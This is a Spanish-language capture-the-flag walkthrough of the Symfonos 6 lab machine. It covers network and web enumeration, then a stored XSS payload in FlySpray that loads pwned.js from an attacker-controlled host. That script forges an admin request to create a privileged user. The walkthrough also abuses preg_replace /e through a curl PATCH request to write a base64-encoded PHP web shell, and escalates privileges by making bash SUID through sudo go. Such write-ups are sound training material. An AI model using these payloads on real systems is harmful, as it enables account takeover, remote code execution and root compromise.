# Symfonos 6

**Sistema Operativo**: Linux

**Dificultad**: Media

**Técnicas Vistas**: Web Enumeration /
FlySpray Exploitation /
Abusing FlySpray / Cross Site Scripting (XSS) /
Getting the administrator to create a new privileged user through XSS /
Information Leakage /
Gitlab Enumeration /
Abusing API + Preg_Replace to achieve RCE on the creation of a new post /
Abusing sudoers privilege (go) [Privilege Escalation] 

Te prepara para las **Certificaciones**: eWPT /
eWPTXv2 /
OSWE /
eCPPTv2 /
eCPTXv2 

![image](https://github.com/user-attachments/assets/209dae1a-8407-4cc4-95c4-9a5e899058e6)

# Reconocimiento

Aplicamos un barrido en la red local utilizando `arp-scan` para encontrar la IP de la maquina victima:
![image](https://github.com/user-attachments/assets/4f811da8-2144-4421-aa50-31cd3733c28e)
- `-I eth0` -> Mi interfaz grafica.
- `--localnet` -> Red local.
- `--ignoredups` -> Que ignore duplicados.



Utilizando `nmap` vemos los puertos abiertos.
![image](https://github.com/user-attachments/assets/dbcc4648-08ff-4126-8cda-afcb1d2dea2c)
- `-p-` -> Escanea todos los puertos 
- `-sS` -> escaneo de tipo SYN
- `--open` -> Todos los puertos abiertos
- `--min-rate=5000` -> Manda mínimo 5000 paquetes por segundo
- `-Pn` -> Asume que el host especificado está activo
- `-vvv` -> Aplica triple Verbose 
- `-n` -> Que no aplique resolución DNS
- `-oG allports` -> manda todo a un archivo con nombre de "allports"


Utilizando `nmap` lanzamos los scripts mas comunes.
![image](https://github.com/user-attachments/assets/58c43f4f-d792-4f2b-9605-a7e27c5318b0)
- `OpenSSH 7.4` -> Versión SSH desactualizada
- `PHP 5.6.40` -> Versión PHP desactualizada

Utilizando `gobuster` encontramos la carpeta **flyspray**
![image](https://github.com/user-attachments/assets/d3f4cb9e-e7a8-471c-ba33-279954cb5678)
- `dir` ->  Buscar directorios 
- `-u` -> Indicar URL
- `-w` ->  Indicar diccionario que voy a utilizar
- `-t` -> Numero de hilos que voy a usar
- `-x` -> Extensiones que quiero que pruebe
- `--add-slash` -> Que coloque una barra al final
- `grep -v "500"` ->  No quiero ver código de estado 500

Simplemente nos registramos
![image](https://github.com/user-attachments/assets/a1b0ed98-681a-4e35-975e-a41f31258032)

---

# CSRF

Utilizaremos este **exploit** para explotarlo:

https://www.exploit-db.com/exploits/41918 

En el campo "Real Name" colocaremos ` "><script src=http://IPATACANTE/pwned.js></script>  `
![image](https://github.com/user-attachments/assets/a2c821bb-02e3-4cfc-9ae8-a8f8eaf01632)



Creamos el archivo `pwned.js`, el cual creara un usuario "hacker" y de contraseña "12345678" con privilegios **root**.

```
var tok = document.getElementsByName('csrftoken')[0].value;

var txt = '<form method="POST" id="hacked_form" action="index.php?do=admin&area=newuser">'
txt += '<input type="hidden" name="action" value="admin.newuser"/>'
txt += '<input type="hidden" name="do" value="admin"/>'
txt += '<input type="hidden" name="area" value="newuser"/>'
txt += '<input type="hidden" name="user_name" value="hacker"/>'
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>'
txt += '<input type="hidden" name="user_pass" value="12345678"/>'
txt += '<input type="hidden" name="user_pass2" value="12345678"/>'
txt += '<input type="hidden" name="real_name" value="root"/>'
txt += '<input type="hidden" name="email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="verify_email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="jabber_id" value=""/>'
txt += '<input type="hidden" name="notify_type" value="0"/>'
txt += '<input type="hidden" name="time_zone" value="0"/>'
txt += '<input type="hidden" name="group_in" value="1"/>'
txt += '</form>'

var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();
```

Abrimos con Python el puerto 80, donde se encuentra nuestro `pwned.js`.
![image](https://github.com/user-attachments/assets/d9fb5817-56f7-4177-91c9-bb655895b98e)

Ponemos un comentario
![image](https://github.com/user-attachments/assets/2f28b883-fbdb-4f20-837a-029608be1659)



Usuario: achilles,
Contraseña: h2sBr9gryBunKdF9


![image](https://github.com/user-attachments/assets/b96c42ea-07e4-43a0-9c64-8a78a4265ea6)

Nos autenticamos como **achilles** en http://symfonos.local:3000 
![image](https://github.com/user-attachments/assets/4110883e-2d2d-4e41-95d6-5d8daa7710b0)

-----


# Explotación de api

Una vez adentro  en los repositorios de achilles, investigando vamos a ver:

Preg_replace



![image](https://github.com/user-attachments/assets/0c2556e6-e1c1-43ea-89ad-3f57331d0daf)
- ` /.*/e ` -> Una expresion regular con **Modificador e** -> vulnerable (le podes meter código php)
- `$content` -> contenido
- `"WIN"` -> una palabra

-----

### Investigando mas vamos armar esta URL api:

curl -s -X POST "http://symfonos.local:5000/ls2o4g/v1.0/auth/login" 

Luego encontraremos que me pide un campo "username" y un campo "password".
![image](https://github.com/user-attachments/assets/335a9400-6486-436c-9680-594080a86d9c)


- ` curl -s -X POST "http://symfonos.local:5000/ls2o4g/v1.0/auth/login" -H "Content-Type: application/json" -d '{"username":"achilles", "password":"h2sBr9gryBunKdF9"}' `

- `-H` -> El Content Type para que me reconozca la data json
- `-d` -> Data en json que quiero mandar
- `username` -> campo username
- `password` -> campo password

Esto nos dará un json web token (pero no tenemos el secreto), asi que por ahora no nos sirve.
Vemos que el "id":1 -> Nos va a servir para explotar el preg_replace 
![image](https://github.com/user-attachments/assets/f5923926-b674-44f6-bc7c-9c8019f50b0c)


---

Vemos que indicando una petición por `PATCH`, y pasando el `id` (que es 1), podemos actualizar el post que esta en http://symfonos.local/posts/ 



![image](https://github.com/user-attachments/assets/c8da2743-dffe-4681-a9a6-f85f9b298fdb)

Al parecer necesitamos poner un campo "text"
![image](https://github.com/user-attachments/assets/d3b97eb3-18ab-4df5-9f8b-977a9304d1be)




Pongo en base64 este script php:



![image](https://github.com/user-attachments/assets/ee6ad1f0-b980-49c8-bc73-41822176ffc2)


- `  curl -s -X PATCH "http://symfonos.local:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjE0ODU3NDAsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.SPUuZ3ybrOID6ktLJNDysNiJK_t97wdwCp5w18puiqg" -d $'{"text": "file_put_contents(\'cmd.php\', base64_decode(\'PD9waHAKIHN5c3RlbSgkX0dFVFsnY21kJ10pOwo/Pgo=\'))"}'   `


- `file_put_contents` -> Crear un archivo y ponerle lo que quieras.

- `base64_decode` -> decodificar el  script php en base64 que hicimos

Query para ganar acceso a la maquina:
![image](https://github.com/user-attachments/assets/593c465a-c4ba-41ce-8f50-8787b5fe0dc8)
![image](https://github.com/user-attachments/assets/54833dc5-a1fa-4111-8dff-15866f1daf30)

-------

# Escalada de privilegios

Nos conectamos como achilles



![image](https://github.com/user-attachments/assets/2ff56b4e-e61e-4a46-b6a4-f269a9171b45)


Con `sudo -l` vemos que podemos ejecutar el binario `go` como root.
![image](https://github.com/user-attachments/assets/6dda3791-38b1-4c56-b0c1-734ff06084d5)


Script de `go` , para ponerle SUID a la bash

https://zetcode.com/golang/exec-command/

```go
package main

import (
    "log"
    "os/exec"
)

func main() {

    cmd := exec.Command("chmod", "u+s", "/bin/bash")

    err := cmd.Run()

    if err != nil {
        log.Fatal(err)
    }
}
```

Ejecutamos con `sudo /usr/local/go/bin/go run go.go` 



![image](https://github.com/user-attachments/assets/634f37ef-7dbe-4d95-b62e-0db8308fd913)

- `go.go ` -> Nombre de mi script
- `run` -> para que inicie mi script

Flag Final:



![image](https://github.com/user-attachments/assets/f0572425-da98-4098-bc91-e878ca7193ea)
